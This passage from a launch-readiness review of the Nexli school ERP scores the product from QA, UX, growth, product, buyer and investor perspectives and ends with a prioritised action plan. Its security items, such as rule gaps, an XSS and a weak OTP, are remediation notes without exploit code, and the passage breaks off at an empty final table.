1. **Vitest** — drop-in for Vite projects, for unit and component tests
2. **`@testing-library/react` + `@testing-library/user-event`** — for component tests
3. **Firebase emulator** already exists — extend it for data-layer integration tests
4. **A Firebase mock layer** for unit tests that should not hit the emulator
5. **A CI step** running both `test:rules` and unit/component tests

---

#### Top 15 QA Actions

**P0 — Fix Before Any Production Use**

1. **Wrap RTE lottery in a `writeBatch()`.** `doRunLottery()` fires `Promise.all` of independent writes. Replace with `writeBatch` so all rank assignments are atomic. Add a recovery mechanism (a "reset lottery" action) for partial-commit states.

2. **Fix `lotteryRank` clear-on-reopen bug.** Line 135 in `ApplicationsTab.tsx` sets `lotteryRank: undefined`. Because `updateIn` calls `stripUndefined`, the rank is never cleared. Change to `lotteryRank: deleteField()`.

3. **Add React error boundaries.** Mount one at the root (`AppLayout`), one per feature module. Without boundaries, any runtime null-dereference renders a blank white screen.

4. **Guard cancelled invoice from payment.** `cancelInvoice()` has no status pre-check. A paid invoice should not be cancellable. Add a guard that rejects if `status === 'paid'`.

5. **Add duplicate detection to student import.** Before `runImport()` commits, query Firestore for existing students with the same `admissionNo`. Surface conflicts before writing.

**P1 — Fix Before General Rollout**

6. **Install Vitest and write unit tests for all pure compute functions.** Priority: `compute.ts` (report card math), `scoring.ts` (career RIASEC), `engine.ts` (XP/badge logic), `salarySchema.ts::computePayslip` (statutory deduction math).

7. **Test `computeAttendance` half-day handling.** Verify XP calculation handles 0.5-day increments correctly. Write a test to confirm.

8. **Add payroll approval transaction safety.** Wrap `approvePayrollRun()` in `runTransaction` to prevent double-approval.

9. **Add admission number uniqueness constraint.** Before saving a new student (form and import), query `where('admissionNo', '==', value)` and block submission if a conflict exists.

10. **Fix the "no sync" messaging in `CollectPaymentPage.tsx`.** Either add "It will sync when you are back online" (matching the attendance pattern) or clearly state that offline payment recording is not supported.

**P2 — Fix Before Scaling Beyond a Pilot**

11. **Test multi-child parent portal rule.** Add a test for `childStudentIds: ['stu1', 'stu2']` verifying access to both children's records but not a third child's.

12. **Add age range validator to DOB fields.** Reject DOB making the student younger than 2 or older than 25 for K-12 schools.

13. **Write unit tests for `statusFor()` boundary conditions.** Test `statusFor(100, 150)` = paid (overpayment), `statusFor(0, 0)` = paid, and confirm no `overpaid` state exists as a deliberate design choice.

14. **Add concurrent attendance write detection.** Implement optimistic locking using Firestore `runTransaction` for attendance saves to prevent silent last-write-wins data loss.

15. **Validate secondary role assignment in Firestore rules.** Only principals or super admins should be able to write `secondaryRoleId` to a member document. Add this to `rules.test.mjs`.

---

### ROLE 11 — UX/UI EXPERT

**Score: 5.5 / 10**
**Verdict:** The design language is beautiful. The mobile UX for the actual users — teachers, gate guards, canteen operators — is borderline unusable. The product is designed for desktop demos, not for the people who will use it daily.

---

#### Findings

**Dark-mode only is a field usability failure.**

The CSS design system (`--bg #080808`, `--surface #121212`) is dark-mode only with no light-mode alternative. For a desktop admin in an air-conditioned office, this looks premium. For a class teacher marking attendance on a ₹8,000 Redmi phone outside during morning assembly — at 400 nits display brightness — the `#080808` background is nearly invisible in direct sunlight. This is the primary operating environment for the most frequent user of the most critical feature (daily attendance). There is no adaptive theme, no high-contrast mode, and no acknowledgment that "mobile-first" must account for outdoor use cases.

**Attendance segmented control has no legend.**

The attendance marking interface presents a segmented control with options `P / A / L / H / V` (or `P / A / L / H / Lv` in some views). No legend is shown anywhere on the screen. A substitute teacher seeing this for the first time cannot determine what "Lv" means (Leave), what "H" means (Holiday), or whether "V" is Vacation or Void. Mislabeled attendance directly corrupts official records. This is not a cosmetic issue — it is a data-quality issue caused by a UX gap.

**No draft saving on StudentFormPage.**

`StudentFormPage` has 5 sections and 20+ fields. There is no draft-save mechanism, no progress indicator showing "Step 2 of 5," and no local-storage persistence. A phone call mid-form, a page refresh, or a browser crash destroys all entered data. In an Indian school admissions context — where the admissions clerk is frequently interrupted — this will happen multiple times daily during peak admission season. The data loss is invisible to the clerk until they return to an empty form.

**Bottom navigation "Chat" label is misleading.**

`src/app/shell/BottomNav.tsx` maps `SHORT['communication'] = 'Chat'`. The Communication module contains circulars, broadcast announcements, and notice board posts — it is explicitly not a chat tool. Parents clicking "Chat" expecting WhatsApp-style messaging will find a one-way notice board and feel deceived. This is a one-line fix with real trust implications.

**SOS modal and soft keyboard conflict on small phones.**

The SOS raise flow on mobile requires both a type selector and a description field. When the soft keyboard opens on the description field (approximately 340px keyboard height on a Redmi 9 with 640px CSS height), the available viewport collapses to approximately 300px. The submit button scrolls off screen. A staff member raising a child safety SOS — an emergency action — cannot see or tap the confirm button without dismissing the keyboard, losing focus, and retyping. Emergency flows must be designed for the most degraded hardware conditions.

**42 navigation items with no grouping.**

The sidebar (`src/app/shell/Sidebar.tsx`) renders up to 42 navigation items as a flat list with no section headers, no separators, and no visual hierarchy. "Timetable" sits next to "SMC" sits next to "Safeguarding" with identical visual weight. Finding any specific module requires scanning the entire list. The correct fix is section grouping: Academic, Finance, Operations, Welfare, Compliance, Platform.

**`v0.1.0` in the sidebar footer.**

`src/app/shell/Sidebar.tsx` renders `NEXLI School ERP v0.1.0` visible to every school user. In any SaaS product the version string signals maturity. `v0.1.0` signals "pre-release" to school administrators evaluating whether to trust Nexli with their data. Remove or replace with the school name.

**Type="number" on monetary input fields.**

`CollectPaymentPage.tsx` and several other fee-related forms use `type="number"` on monetary inputs. On Android, this renders a numeric keyboard with up/down increment arrows. The increment arrow on a ₹50,000 fee field changes the value by ₹1 per tap — 50,000 taps to go from 0 to the correct value — or worse, a mis-tap increments to ₹50,001 and the clerk doesn't notice. The correct implementation is `type="text" inputMode="decimal"` which shows the numeric keyboard without increment controls.

**No skip-to-content link (WCAG 2.4.1 failure).**

There is no skip-to-content link before the sidebar navigation. A keyboard or screen reader user must tab through 25+ navigation items on every page load before reaching the main content area. This is a WCAG Level A failure (2.4.1 Bypass Blocks). Screen readers used by teachers with visual impairments will read "alert-triangle" and "users" (KPICard icons are not `aria-hidden`) before every KPI value.

**No Hindi or regional language support.**

The entire interface is English-only. Outside metro cities, most school principals, teachers, and parent users are more comfortable in Hindi or their regional language. A school in Rajasthan, Bihar, or Uttar Pradesh — which collectively represent a large addressable market — will face staff adoption resistance from non-English-comfortable users. Internationalization infrastructure (i18next is in the dependency list but not implemented for any non-English content) should be foundational before a regional rollout.

**No PTM scheduling UX.**

PTM (Parent-Teacher Meeting) scheduling is one of the highest-engagement features schools want from a parent portal. Indian schools schedule PTMs quarterly. The navigation includes a PTM entry point. There is no implementation behind it.

---

#### Recommended Fixes

**P0 (before any real user sees the product):**
1. Add an attendance legend to the segmented control — one line per status: `P = Present, A = Absent, L = Late, H = Half-Day, Lv = Leave`
2. Fix `SHORT['communication'] = 'Chat'` to `'Notices'` or `'Circulars'`
3. Remove `v0.1.0` from the sidebar footer
4. Change `type="number"` to `type="text" inputMode="decimal"` on all monetary inputs

**P1 (before general rollout):**
5. Add a theme option (dark/light/auto) — even just a high-contrast light mode for outdoor mobile use
6. Add section headers to the sidebar: Academic, Finance, Operations, Welfare, Compliance
7. Add draft-save to StudentFormPage using localStorage keyed on school + admissionNo
8. Add a skip-to-content link as the first focusable element in `AppLayout`
9. Make all decorative icon elements `aria-hidden="true"`
10. Fix SOS modal: ensure confirm button is always visible above keyboard using `position: fixed; bottom: calc(env(safe-area-inset-bottom) + 16px)` on the action row

**P2 (product maturity):**
11. Add a global error feedback template with actionable next steps, replacing generic "Please try again" messages
12. Add delete confirmation dialogs for Guardian "Remove" action and other destructive operations
13. Add a "Collecting payment for invoice X — ₹Y" confirmation step before triggering `recordPayment()`
14. Build PTM scheduling UX
15. Begin i18next integration starting with Hindi for attendance and fee modules

---

#### Severity Summary

| Finding | Severity |
|---------|----------|
| Dark-mode only — invisible on budget Android outdoors | High |
| No attendance legend — data quality risk | High |
| No draft save on StudentFormPage — data loss | High |
| SOS modal keyboard conflict — emergency UX failure | High |
| "Chat" label for circulars module — misleads parents | Medium |
| 42 nav items with no grouping | Medium |
| `v0.1.0` in sidebar — signals pre-release | Medium |
| `type="number"` on monetary inputs | Medium |
| No skip-to-content link — WCAG 2.4.1 failure | Medium |
| No Hindi/regional language support | High |
| No PTM scheduling | High |

---

### ROLE 12 — GROWTH STRATEGIST

**Score: 4 / 10**
**Verdict:** You have built a feature-complete product with no distribution mechanism. The product cannot acquire, onboard, or retain customers at scale today.

---

#### Findings

**No self-serve trial flow.**

Every school in India that wants to try Nexli must contact a human, wait for a Super Admin to manually provision the school (7-step wizard), communicate a temporary password out-of-band, and then manually configure grades, sections, subjects, and staff. There is no self-serve trial, no free trial with data isolation, and no trial-to-paid conversion flow. Every competitor in the Indian school ERP market (Fedena, Edunext, SchoolEasy, MySchoolPage) offers a self-service demo or trial. A school administrator who lands on the Nexli website and wants to evaluate the product today has no path forward that does not require a phone call.

**No freemium entry point.**

The pricing model (₹4,999/₹9,999/₹19,999 per month) targets mid-to-large schools. There is no free tier or freemium model to capture smaller schools (under 200 students) that could grow into paid plans. Indian school purchasing cycles are slow — a school that uses a free tier for 6 months is significantly more likely to convert than one that receives only a sales demo.

**No SMS or WhatsApp notifications.**

The parent portal is a passive ledger. Parents do not proactively check web apps. An Indian parent's primary communication channel is WhatsApp. Without push notifications for: absent student, fee due, fee receipt issued, circular published, and SOS resolved — the parent-facing features have near-zero real-world adoption. Word-of-mouth growth from parents ("the school uses this app and it told me my daughter was absent before I even texted the teacher") does not happen. This is the single feature that drives viral adoption in school management software.

**150-staff onboarding requires 150 individual provisioning actions.**

There is no staff bulk import, no invitation email system, and no QR code onboarding. Each staff member must be manually provisioned by an admin. A 150-staff school requires 150 separate form submissions + password communications. This creates a massive support burden for the first onboarding and virtually guarantees that most schools will give up before fully onboarding their staff.

**No data migration path.**

Every Indian school that is evaluating Nexli is migrating from something — a spreadsheet, a legacy ERP (Fedena, Edunext), or a hybrid of both. There is no data migration tooling, no import format documentation, and no migration service offering. The onboarding cost for a school with 500 existing students, 5 years of historical fees, and established attendance records is effectively infinite. The only entry point is a brand-new school or a school willing to start fresh.

**No payment gateway = no MRR.**

The plan tiers are defined in code. There is no checkout flow, no automated billing, and no subscription enforcement. Growth strategy is meaningless without a revenue mechanism.

**The AI story is the biggest GTM risk.**

The "AI-powered predictions" and "Smart Briefing" features shown in demos are hardcoded static data. When the first school administrator opens DevTools and finds `AT_RISK = [{name: 'Student A', score: 91}]`, the credibility of every other claim in the product is destroyed. In the Indian school ERP market, trust is everything — principals talk to each other. A single exposure of fake AI data becomes a WhatsApp group story shared across 50 schools.

---

#### Recommended Fixes

1. Build a minimal self-serve trial flow: school name + admin email + password → auto-provisioned demo environment with seeded data.
2. Integrate MSG91 or Fast2SMS for parent SMS at ₹0.12/SMS — SMS for absence and fee due pays for itself in parent adoption.
3. Build a staff bulk import from CSV — no growth at scale without this.
4. Remove all fake AI data before any external demo or public launch.
5. Integrate Razorpay — even a "generate payment link" for subscription billing.
6. Document and build one complete data migration path (from a common source like Fedena or a standard CSV format) to reduce onboarding friction.

---

#### Severity Summary

| Finding | Severity |
|---------|----------|
| No self-serve trial flow | Critical |
| No SMS/WhatsApp notifications | Critical |
| No payment gateway | Critical |
| 150-staff manual provisioning | High |
| No data migration tooling | High |
| Fake AI data in demos | Critical |
| No freemium entry point | Medium |

---

### ROLE 13 — PRODUCT MANAGER

**Score: 4.5 / 10**
**Verdict:** 55 modules built, several core workflows broken. The product was built wide instead of deep, and the critical paths that school administrators will use on Day 1 are either missing, broken, or hollow.

---

#### Findings

**The breadth-depth tradeoff went the wrong way.**

A school administrator evaluating Nexli on their first day will open: attendance, fees, and communication — in that order. All three have significant issues. Attendance has a missing legend for abbreviations, a `roster.length` bug that silently writes stale data on student swap, and no substitute teacher management. Fees has no payment gateway, a race condition in concession application, and a cancelled-invoice bug that makes paid amounts invisible. Communication shows a "Chat" label for a notice board module, has no SMS or WhatsApp delivery, and no read receipts.

**PTM (Parent-Teacher Meeting) scheduling is missing.**

PTM scheduling is one of the most calendar-defining operations in an Indian school. It requires: scheduling slots per teacher, parent booking of slots, reminder notifications, and attendance confirmation. The navigation includes PTM. There is no implementation. This will be the first question from any school that has ever managed PTM logistics.

**Substitute teacher management is missing.**

When a teacher is absent, the school needs to immediately assign a substitute to the class and notify affected students. The timetable module exists with a full bell schedule. The attendance module exists. There is no substitute assignment workflow, no coverage request, and no notification chain for teacher absences.

**Board exam result import is missing.**

The gradebook correctly handles internal assessments, periodic tests, and term exams. Board exam results (CBSE, ICSE, IB, IGCSE) arrive as CSV or XML files from the board's portal. There is no import mechanism. A school that uses Nexli for their gradebook will have a split record: internal assessments in Nexli, board results in spreadsheets.

**The module count creates a navigation UX problem.**

55+ modules with ~118 roles means that a typical staff member (class teacher) has a sidebar with potentially 15–20 items, most of which they will never use. The module registry and `Guarded` wrappers correctly scope menu items to permitted roles, but there is no concept of pinned/favorite modules, no "recently used" section, and no role-based suggested order. A new class teacher will spend their first week lost in navigation.

**Gamification badges are volatile.**

`src/features/gamification/engine.ts` is a deterministic pure function — badges and XP are computed fresh from the current data on every load. This means a retroactive attendance correction (marking a student who was mistakenly marked present as absent) silently un-earns their "Perfect Attendance" badge. The student sees their badge disappear with no explanation. In an environment where badges are used to motivate student behavior, invisible badge revocation destroys the incentive system.

**Analytics and report builder have no export to PDF or print.**

The analytics dashboards compute real aggregated data (attendance rates, fee collection trends, assessment performance). The report builder allows custom filters. But there is no export mechanism — no PDF, no Excel, no CSV. A principal who builds a custom fee collection report for a board meeting has no way to print or share it.

---

#### Recommended Fixes

1. Build PTM scheduling as the top-priority missing feature — it is visible in navigation and asked for by every school.
2. Build substitute teacher management — link to staff attendance and timetable.
3. Add board exam result import (CBSE CSV format is standardized).
4. Add analytics export to PDF and CSV.
5. Add a "Recently used" or "Favorites" section to the sidebar navigation.
6. Fix gamification badge persistence — store earned badge events in Firestore rather than recomputing; allow manual revocation with an audit trail.

---

#### Severity Summary

| Finding | Severity |
|---------|----------|
| PTM scheduling — nav item with no implementation | High |
| Substitute teacher management missing | High |
| Board exam result import missing | High |
| Analytics export missing | Medium |
| Gamification badges volatile | Medium |
| Navigation UX for multi-module sidebar | Medium |

---

### ROLE 14 — ENTERPRISE CUSTOMER

**Score: 5.5 / 10 ("Maybe, but not yet")**
**Verdict:** I would not sign a contract today. I would schedule a follow-up in 90 days, contingent on the critical gaps being resolved.

---

#### Findings

As a school administrator considering Nexli for 400 students, 120 staff, and a parent community of 350 families, here is what I would need before signing:

**Data migration from our existing system.**

We currently use a mix of Tally (finance), a legacy attendance register in Fedena, and fee records in Excel. We have 3 years of student data, 5 years of fee history, and a staff database with 120 records. Nexli has no migration tooling, no import format for historical fees, no Fedena export bridge, and no bulk staff provisioning. The onboarding cost — manually re-entering 400 students, 120 staff, 5 years of fee history, and configuring 45 sections, 15 grades, and all subjects — is estimated at 3–4 weeks of dedicated admin time before the system is usable. We would need this offset by professional services or tooling.

**30-day pilot with our own data.**

We would not commit before running a 30-day pilot with real data from one class (say, Grade 8A with 42 students). We would mark attendance daily, collect one fee installment, generate one report card, and test the parent portal with 5 parents. The pilot would require: a test environment separate from production (does not exist), data import of 42 students (CSV import exists but is untested with our format), and at least one parent using the portal (requires provisioning — no self-service).

**DPDP compliance documentation.**

We process student Aadhaar numbers, medical conditions, guardian phone numbers, and counseling notes. Under the DPDP Act 2023, we need a Data Processing Agreement (DPA) with Nexli as our data processor, documentation of security controls, and proof that data does not leave India. None of this documentation exists. The consent module exists but is not enforced as a gate — we need enforceable consent before we can use the system for any student.

**SLA for uptime and support.**

We need 99.5% uptime SLA during school hours (7 AM – 5 PM IST, Monday–Saturday). We need a support response time of under 4 hours for critical issues (fee collection errors, attendance not saving). We need a named support contact. None of this infrastructure exists — there is no support ticketing system, no SLA documentation, and no monitoring that would even detect an outage.

**Staff onboarding.**

We have 120 staff members. Manual provisioning of 120 accounts — with temporary passwords communicated individually — is not acceptable. We need either bulk import with email-based invitation, or an SSO bridge (Google Workspace, which we use). Neither is implemented.

**Parent portal adoption.**

We send 350 WhatsApp messages to parents for every event: fee reminders, absence notifications, circular distribution, exam schedules. If Nexli cannot send WhatsApp or at minimum SMS notifications, our parent adoption will be zero. No parent in our school community will proactively check a web app. This is a non-negotiable requirement.

**What would make me sign today:**
- A professional services offer to handle data migration and initial setup
- A signed DPA
- Commitment to implement SMS notifications within 60 days
- A dedicated support contact for the first 3 months
- A refund clause if critical features (fees, attendance, report cards) do not function correctly within 30 days

**What would make me sign in 90 days:**
- All of the above, plus SMS notifications actually shipped
- Staff bulk import operational
- A real 30-day pilot completed successfully in a test environment

---

#### Severity Summary

| Finding | Severity |
|---------|----------|
| No data migration tooling | Critical (blocks adoption) |
| No DPDP compliance documentation | Critical (legal risk) |
| No SMS/WhatsApp notifications | Critical (parent adoption) |
| No staff bulk import | High |
| No support SLA or ticketing | High |
| No 30-day pilot environment | Medium |

---

### ROLE 15 — INVESTOR

**Score: 4 / 10**
**Verdict:** Impressive technical depth, no revenue mechanism. The AI positioning is a liability that could destroy the company's credibility before it reaches product-market fit.

---

#### Findings

**The market opportunity is real.**

India has 45,000+ private unaided schools, 1.5 million+ government schools, and a rapidly growing mid-market of private schools with 200–1,000 students that are transitioning from spreadsheets to digital. The ERP category in Indian education is ₹2,000 crore+ and fragmented — no single player has more than 15% market share. The pain of existing tools (Fedena is old, Edunext is expensive, SchoolEasy is basic) is genuine. A product that elegantly solves the full operations stack — academics, finance, HR, compliance, and parent communication — has a real competitive moat.

**The technical moat is genuine.**

The multi-tenant Firestore architecture, the 3-layer data-driven RBAC, the 55+ module breadth, and the design quality (Apple Enterprise × Linear × Stripe Dashboard) are materially better than any existing Indian school ERP. The code quality (TypeScript strict mode, atomic payment transactions, security rules test suite) reflects genuine engineering discipline. This is not a no-code tool or an outsourced product — it is a carefully built system.

**The AI positioning is a critical liability.**

The fundraising deck (and presumably any demo) shows "AI-powered at-risk student detection," "Smart Briefing," and "AI Assistants" as premium differentiation features. The actual implementation:
- `PredictionsTab.tsx`: `AT_RISK = [{name: 'Student A', score: 91}, {name: 'Student B', score: 87}]` — hardcoded fake student names with fabricated risk scores
- `SmartBriefingTab.tsx`: `SUMMARY = "Term 2 academic performance has improved by 4.2%..."` — static hardcoded string
- `AssistantsTab.tsx`: all inputs `disabled tabIndex={-1} aria-hidden="true"` — the entire tab is decorative

These are presented behind a blur overlay (`filter: blur(8px)`) with a "Coming Soon" badge. But the fake data is in the DOM. Any investor, prospect, or competitor who inspects the source can find it. In the post-LLM era, investors are acutely sensitive to AI washing. A single tweet showing `AT_RISK = [{name: 'Student A'}]` in the source can end a fundraise.

**No revenue mechanism today.**

The ₹4,999/₹9,999/₹19,999 plan structure is defined in `platform/meta.ts`. There is no payment gateway, no automated billing, no subscription enforcement, and no checkout flow. Every school is using the product for free. ARR is zero. CAC is infinite. There is no MRR to show in a fundraising context. For a seed raise, this is acceptable if the timeline to revenue is clear and credible. For a Series A, this would be disqualifying.

**Regulatory exposure creates downside risk.**

The system handles POCSO cases (children's safeguarding data), medical records (health data of minors), and Aadhaar fragments — all of which are regulated under the DPDP Act 2023, the POCSO Act 2012, and the IT Act 2000. The current security posture (no App Check, no security headers, messaging data unprotected by Firestore rules, a service account key on the developer's machine) creates material compliance exposure. A single data breach involving a minor's POCSO case or medical record could result in regulatory action, press coverage, and reputational damage that ends the company before it reaches scale. This is the principal downside risk in the investment case.

**The path to investability:**

For a seed SAFE at ₹2–5 crore:
- Fix the P0 security issues (service account key, App Check, messaging rules)
- Remove or clearly caveat all AI features
- Onboard 2–3 pilot schools with real data, real concurrent users, and no data corruption
- Show 3 months of operational stability at the pilot schools
- Build and demonstrate the payment gateway integration

At that point, the investment case is: proven product in an underserved market, strong technical foundation, genuine design differentiation, clear path to recurring revenue.

For a pre-seed angel round today:
- The technical foundation justifies ₹50–75 lakh to fix the security issues, implement payments and SMS, and onboard the first paying school
- The AI features must be removed before any investor sees a demo

---

#### Severity Summary

| Finding | Severity |
|---------|----------|
| Fake AI data — investment credibility risk | Critical |
| No revenue mechanism | Critical |
| Regulatory exposure (DPDP/POCSO) — downside risk | High |
| No paying customers or ARR | High |
| No CI/CD or error monitoring — operational risk | Medium |

---

## MASTER FINDINGS

---

### ARCHITECTURE

**What is genuinely well-architected:**

- Multi-tenant isolation (`schools/{schoolId}/…`) with Firestore path enforcement — solid, no cross-tenant leakage
- 3-layer RBAC (`compileRole()` + catalog ← global override ← per-school override) — data-driven, 118 roles without code changes, correct inference rules
- Module registry (`registerModule()` + `React.lazy()` + `Guarded` + `RoleRoutes`) — clean architecture for 55+ modules
- Payment atomicity (`recordPayment()` using `runTransaction`) — correct, receipt counter + payment write + invoice status update are atomic
- Gamification engine — deterministic pure function, honest empty states
- Career scoring — pure RIASEC function, testable
- Messaging — atomic batch writes, escalation ladder, SLA tracking
- TypeScript strict mode, `noUnusedLocals` — genuine discipline throughout

**What needs fixing:**

- `RoleRoutes` rebuilds on every render — no `useMemo`; memoize keyed on permissions + flags + delegatedModules
- Session context is monolithic — 12 fields in one context; split into auth + school + permissions
- `useCollection` deps instability — caller-supplied deps array creates stale subscriptions at inline literal call sites
- `permissionListGrants()` is O(n) — should be O(1) via a pre-built `Set<string>` at role-compile time
- `persistentMultipleTabManager` requires Blaze tier — silently broken on Spark
- No React ErrorBoundary anywhere — one render crash = white screen for the entire school
- Secondary Firebase app for provisioning has no rate limiting — can create accounts at arbitrary speed

---

### SECURITY

**Summary of P0 Issues (fix before any school touches the product):**

1. Rotate service account key (`047ae6d8...`) — Admin SDK bypasses all Firestore rules
2. Enable Firebase App Check — rules are the only defense without it
3. Block `grantedPermissions` self-write in member update rule — full privilege escalation path
4. Block blacklisted visitor check-in at form submission level — child safety

**Summary of P1 Issues (before first school onboarding):**

5. Add Firestore rules for `conversations` and `messages` — currently any member reads all school messages
6. Add security headers to `firebase.json` — no CSP, no X-Frame-Options, no HSTS
7. Add 14 unguarded collections to `isRestrictedCollection()` — vendor, expense, procurement, SMC, UDISE, visitor, finance settings
8. Fix stored XSS in certificate preview — `accentColor` injected into CSS without sanitization
9. Replace `Math.random()` OTP with `crypto.getRandomValues()`
10. Clear IndexedDB on logout — sensitive data cached in shared/stolen devices

**Compliance gaps:** DPDP consent not enforced as gate; POCSO 24-hour reporting SLA absent; audit log does not cover sensitive reads; Firebase Analytics may violate DPDP data localisation for minors.

---

### PRODUCT

**Genuinely complete and valuable:**
Executive Dashboard, fee payment flow (manual), UDISE live report, gamification, career counseling, transport (except Live Map), hostel (except allocation race), messaging, certificates

**UI-complete but functionally hollow:**
Transport Live Map (no GPS data source), Library fine column (no calculator), AI Predictions/Briefing/Assistants (hardcoded fake data), Canteen headcount (no dedup enforcement)

**Incomplete for stated purpose:**
Counseling (no per-counselor scoping, write-once), POCSO (no escalation, no SLA), SPED/IEP (no progress history), SMC Budget (disconnected from actual financials), Visitor Blacklist (advisory only)

**Missing for Indian schools:**
SMS/WhatsApp notifications, online fee collection, staff bulk import, PTM scheduling, board exam result import, Tally export, biometric bridge, Hindi language support, data migration tooling

---

### BUSINESS

**Revenue:** No mechanism exists to collect money today. ₹4,999/₹9,999/₹19,999 plan tiers are data structures with no checkout. Subscription enforcement is a manual browser-tab operation.

**GTM:** No self-serve trial, no freemium tier, no staff invitation flow, no data migration tooling, no parent push notifications. Every acquisition requires manual developer intervention.

**Regulatory:** DPDP Act compliance documentation does not exist. No DPA template for school contracts. No consent enforcement. POCSO mandatory reporting SLA not implemented.

**Competitive position:** Design and architecture are materially better than existing Indian school ERPs. Integration depth (payments, SMS, Tally, biometric) is materially worse. The AI positioning is a liability.

---

## LAUNCH READINESS SCORECARD

| Reviewer | Role | Score | Verdict |
|----------|------|-------|---------|
| Founder | Vision/market | 3/10 | Impressive demo, not a deployable product |
| Co-Founder | Reality check | 6.2/10 | Architecture excellent; several features functionally hollow |
| CTO | Technical leadership | 2/10 | Not launch-ready — critical infrastructure gaps |
| CPO | Product depth | 4.5/10 | Wide feature set, shallow on critical paths |
| CFO | Revenue readiness | N/A | Cannot charge money today — no mechanism exists |
| Senior Software Architect | Code architecture | 4/10 | Solid design, critical race conditions |
| Principal Engineer | Code correctness | 4/10 | 20 new bugs; financial writes dangerous under concurrent load |
| Security Engineer | Security posture | 2/10 | Cannot handle minors' data at any production scale |
| DevOps Engineer | Infrastructure | 3/10 | No monitoring, no CI/CD, Spark tier will fail |
| QA Lead | Test coverage | 2/10 | Zero unit tests; RTE lottery corruption = statutory risk |
| UX/UI Expert | User experience | 5.5/10 | Beautiful design, mobile UX broken for real users |
| Growth Strategist | GTM readiness | 4/10 | Feature-complete product, no distribution mechanism |
| Product Manager | PM assessment | 4.5/10 | 55 modules built, core flows broken |
| Enterprise Customer | Buyer perspective | 5.5/10 | Would not sign today; follow-up in 90 days |
| Investor | Investment case | 4/10 | Real moat, no revenue, AI claim is a liability |
| **COMPOSITE** | | **3.7 / 10** | **Not launch-ready** |

---

## PRIORITIZED ACTION PLAN

Timeline references have been removed. Actions are grouped by impact severity only.

---

### P0 — Immediate Priority (Security — Before Any School Touches the Product)

| # | Action | File | Notes |
|---|--------|------|-------|
| 1 | Rotate Firebase service account key (`047ae6d8...`) | Firebase Console | Admin SDK bypasses all Firestore rules |
| 2 | Block `grantedPermissions` from member self-write in Firestore rules | `firestore.rules:254–257` | Closes full privilege-escalation path |
| 3 | Block blacklisted visitor submit in `VisitorCheckInPage` | `visitor/VisitorCheckInPage.tsx` | Court-restricted persons can currently be checked in |
| 4 | Add `Content-Security-Policy` and `X-Frame-Options` headers | `firebase.json` | No XSS protection or clickjacking protection exists |
| 5 | Disable production source maps | `vite.config.ts:49` | Full source code currently served in production |
| 6 | Replace `Math.random()` OTP with `crypto.getRandomValues()` | `visitor/visitorSchema.ts:35` | 9,000-value space, non-cryptographic |

---

### P1 — High Priority (Data Integrity and Critical Security)

| # | Action | File | Notes |
|---|--------|------|-------|
| 7 | Enable Firebase App Check (reCAPTCHA Enterprise) | `lib/firebase.ts` | Seam already documented in file; closes unauthenticated API access |
| 8 | Add Firestore rules for `conversations` and `messages` | `firestore.rules` | Any member currently reads all school messages |
| 9 | Add 14 unguarded collections to `isRestrictedCollection()` | `firestore.rules` | vendors, expenses, requisitions, purchase_orders, goods_receipts, smc_*, compliance_*, udise_profile, rte_*, visitor_*, fee_heads, fee_structures, finance_settings |
| 10 | Fix `accentColor` XSS in certificate preview | `certificates/print.ts` | Validate against `/^#[0-9A-Fa-f]{6}$/` before CSS injection |
| 11 | Add React ErrorBoundary at root and per feature module | `app/providers/` | One render crash = white screen for entire school |
| 12 | Fix `roster.length` useEffect dep → `rosterKey` in 3 modules | `attendance/MarkAttendancePage.tsx`, `transport/BusAttendanceTab.tsx`, `hostel/RollcallTab.tsx` | Student swap = stale entries saved under wrong student ID |
| 13 | Wrap hostel allocation + room counter in `runTransaction` | `hostel/AllocationsTab.tsx` | Concurrent allocations overflow room capacity |
| 14 | Fix RTE lottery: replace `Promise.all` with `writeBatch`; fix `lotteryRank: undefined` → `deleteField()` | `rte/ApplicationsTab.tsx` | Partial failure = permanently corrupted lottery state; violates RTE Act |
| 15 | Replace TC number `Date.now().slice(-4)` with transaction-based `finance_counters` pattern | `students/tc/TCDetailPage.tsx` | Collides every 10 seconds on legal transfer documents |
| 16 | Block `cancelInvoice` when `paidAmount > 0` | `finance/data.ts:85` | Paid amounts become invisible on cancelled invoices |
| 17 | Add payroll run sentinel doc before writing payslips | `payroll/RunsTab.tsx:100–112` | Partial failure leaves orphaned payslips; run totals wrong on retry |
| 18 | Upgrade to Firebase Blaze tier with billing budget cap | Firebase Console | Spark will fail at even one real school's concurrent load |
| 19 | Add missing composite Firestore indexes (run emulator, collect all missing-index URLs) | `firestore.indexes.json` | 2 indexes for 321 query operations; hard runtime errors under real use |
| 20 | Clear IndexedDB on logout | `lib/auth.ts` | Sensitive data persists on shared/stolen devices |

---

### P2 — Medium Priority (Product Honesty and UX Critical Path)

| # | Action | Notes |
|---|--------|-------|
| 21 | Remove fake data from AI tabs OR clearly label as "Demo Preview — Coming Soon" | `insights/PredictionsTab.tsx`, `SmartBriefingTab.tsx`, `AssistantsTab.tsx` — fake student names in DOM |
| 22 | Relabel Live Map as "Stop Map" or build minimal driver PWA | Transport will always show 0 vehicles without a GPS data source |
| 23 | Remove fine column from Library OverdueTab OR implement configurable fine calculator | Currently shows `—` for every overdue book |
| 24 | Fix canteen headcount to use upsert key (`${date}_${mealType}` as document ID) | Double-entry doubles weekly totals with no correction path |
| 25 | Scope counseling sessions to `counselorUid` for non-leadership roles | Confidentiality broken in all multi-counselor schools |
| 26 | Add POCSO mandatory reporting deadline field + overdue alert | POCSO Act Section 19 statutory requirement |
| 27 | Add IEP goal `progressLog[]` (append, not overwrite status) | SPED compliance; status updates currently overwrite history |
| 28 | Fix `recomputeFromExisting` to recalculate ESI/PT from new gross after LOP change | `payroll/RunDetailPage.tsx:342` — wrong statutory deductions |
| 29 | Fix `ResultsTab.computeRow` to exclude `max` for papers with no entered marks | Students who sit partial exams currently appear to fail |
| 30 | Add attendance legend to segmented control (P = Present, A = Absent, etc.) | Teachers cannot determine what "Lv" means |
| 31 | Fix `type="number"` → `type="text" inputMode="decimal"` on monetary inputs | Android increment arrows on fee fields |
| 32 | Add draft-save to StudentFormPage | 20+ fields, data lost on any interruption |
| 33 | Add Sentry error monitoring | Install `@sentry/react`, wrap root with `Sentry.ErrorBoundary` |
| 34 | Remove `v0.1.0` from sidebar footer | Signals pre-release software to risk-averse school administrators |
| 35 | Remove backup log delete button (`itadmin/SystemTab.tsx`) | Audit trail must be append-only; currently deletable |

---

### P3 — Ongoing Improvements (Infrastructure and GTM)

| # | Action | Notes |
|---|--------|-------|
